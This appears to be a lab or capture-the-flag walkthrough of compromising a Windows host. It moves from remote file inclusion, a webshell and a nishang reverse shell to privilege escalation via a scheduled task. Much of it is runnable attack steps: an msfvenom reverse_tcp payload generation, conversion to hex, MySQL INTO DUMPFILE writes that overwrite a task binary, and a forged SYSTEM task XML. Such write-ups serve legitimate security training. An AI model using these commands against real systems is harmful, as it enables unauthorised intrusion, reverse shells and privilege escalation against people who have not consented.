after nmap scan there was no anonymous access 
targetted web app , dirbusted - found a route `site` 
vulnerable to rfi executed wwwolf webshell , laudanum and other webshells are not working there 
executed nishang invokepowershelltcp script and executed it to get reverse shell
after some enumeration found a directory which is running a script every 5 min as admin 
replaced the task with my custom binary and got admin 

**but there is another path to it for escalation** 

we found `phpmyadmin` which is being accessed by localhost only 
used chisel to port forward , then accessed it on browser now i have the mysql access 

*we could also port forward to mysql directly , and then access it but phpmyadmin have graphical interface which makes it easy to navigate*

### 1.1 Check FILE Privilege

```sql
-- Check if current MySQL user has FILE privilege
SELECT * FROM information_schema.USER_PRIVILEGES 
WHERE PRIVILEGE_TYPE = 'FILE';

-- Check current user
SELECT user();
SELECT current_user();
```

### 1.2 Check secure_file_priv (Critical)

sql

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

|Result|Meaning|
|---|---|
|Empty string `""`|No restriction — write anywhere ✅|
|`NULL`|File operations disabled ❌|
|`/some/path/`|Can only write to that path|

### 1.3 Verify Write Access with Test File

sql

```sql
-- Write a test file to confirm write works
SELECT 'test' INTO OUTFILE 'C:\\Windows\\Temp\\test.txt';
```

Then on target:

cmd

```cmd
type C:\Windows\Temp\test.txt
-- output: test ✅
```

---

## Phase 2 — Enumerate Scheduled Tasks

### 2.1 List All Tasks and Their Binaries

cmd

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName\|Task To Run\|Run As User\|Next Run"
```

### 2.4 Check Binary Permissions

cmd

```cmd
-- Check if you can overwrite the task binary
icacls "C:\path\to\task\binary.exe"
```

**Permission flags that allow exploitation:**

|Flag|Meaning|
|---|---|
|`(F)`|Full Control ✅|
|`(W)`|Write ✅|
|`(M)`|Modify ✅|
|`(RX)`|Read+Execute ❌|
## Phase 3 — Prepare Reverse Shell

### 3.1 Generate Payload on Kali

bash

```bash
# Staged payload (smallest ~7KB — recommended)
msfvenom -p windows/x64/shell/reverse_tcp \
    LHOST=yourip \
    LPORT=4444 \
    -f exe -o shell.exe

# Check size
ls -lh shell.exe

# Verify architecture matches target
file shell.exe
```

> ⚠️ **Architecture must match target**
> 
> - Run `echo %PROCESSOR_ARCHITECTURE%` on target first
> - AMD64 → use `windows/x64`
> - x86 → use `windows/x86`

### 3.2 Convert to Hex

bash

```bash
# Convert exe to hex string
xxd -p shell.exe | tr -d '\n' > shell.hex

# Verify it starts with MZ header (4d5a)
head -c 8 shell.hex
# should show: 4d5a9000 ✅
```

now we have two options `dumpfile` and `outfile`
⚠️ **DUMPFILE vs OUTFILE**

| Command         | Use for                    | Behaviour                                        |
| --------------- | -------------------------- | ------------------------------------------------ |
| `INTO DUMPFILE` | Binary files (exe, dll)    | Writes raw bytes exactly ✅                       |
| `INTO OUTFILE`  | Text files (bat, xml, ps1) | Adds newlines, escapes chars — breaks binaries ❌ |

executed this command on phpmyadmin to overright the file 

⚠️ **Critical: No quotes around hex value**

```sql
SELECT 0x4d5a...   INTO DUMPFILE 'path'  -- ✅ raw binary written
SELECT '0x4d5a...' INTO DUMPFILE 'path'  -- ❌ text string written, not executable
```

```sql
SELECT 0x[your hex data] INTO DUMPFILE 'C:\\Windows\\Temp\\shell.exe'
```

after execution i found it via my shell and varified that it exists 
it get executed and then i got the shell

**THERE IS STILL ANOTHER PATH TO IT BY OVERRIGHTING THE TASK XML AND THEN EDITING IT TO MAKE CODE EXECUTION OF A REVERSE SHELL**
### Overwrite Task XML

Task XMLs are stored at:

```
C:\Windows\System32\Tasks\TaskName
C:\Windows\SysWOW64\Tasks\TaskName
```

Read original XML first via MySQL:

sql

```sql
SELECT LOAD_FILE('C:\\Windows\\System32\\Tasks\\TaskName');
```

Write new XML pointing to your shell:

sql

```sql
SELECT '<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>C:\Windows\Temp\shell.exe</Command>
    </Exec>
  </Actions>
</Task>'
INTO OUTFILE 'C:\\Windows\\System32\\Tasks\\TaskName';
```